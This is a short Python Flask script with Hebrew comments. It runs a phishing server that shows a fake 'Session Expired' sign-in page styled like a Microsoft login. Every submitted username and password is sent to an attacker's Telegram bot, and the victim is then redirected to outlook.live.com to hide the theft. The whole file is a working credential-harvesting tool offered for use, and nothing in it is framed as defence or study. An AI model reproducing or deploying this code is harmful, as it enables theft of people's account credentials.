from flask import Flask, request, redirect, render_template_string
import requests

app = Flask(__name__)

# הגדרות טלגרם
TG_TOKEN = "YOUR_TELEGRAM_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"

# דף התחברות מעוצב (HTML פשוט)
HTML = '''
<html>
<head><title>Sign In</title></head>
<body style="font-family: Arial; text-align: center; margin-top: 100px;">
    <div style="display: inline-block; border: 1px solid #ccc; padding: 20px; border-radius: 5px;">
        <h2>Session Expired</h2>
        <p>Please log in again to continue.</p>
        <form method="POST">
            <input type="text" name="u" placeholder="Email or Username" required style="margin-bottom: 10px; width: 200px;"><br>
            <input type="password" name="p" placeholder="Password" required style="margin-bottom: 10px; width: 200px;"><br>
            <input type="submit" value="Login" style="background: #0078d4; color: white; border: none; padding: 5px 20px; cursor: pointer;">
        </form>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('u')
        password = request.form.get('p')
        
        # שליחה לטלגרם
        data = f"📩 **New Credentials Captured!**\n👤 User: `{username}`\n🔑 Pass: `{password}`"
        requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage", data={'chat_id': CHAT_ID, 'text': data, 'parse_mode': 'Markdown'})
        
        # העברה לאתר לגיטימי
        return redirect("https://outlook.live.com")
    
    return render_template_string(HTML)

if __name__ == "__main__":
    print("[*] Phishing server starting on port 8080...")
    app.run(host='0.0.0.0', port=8080)
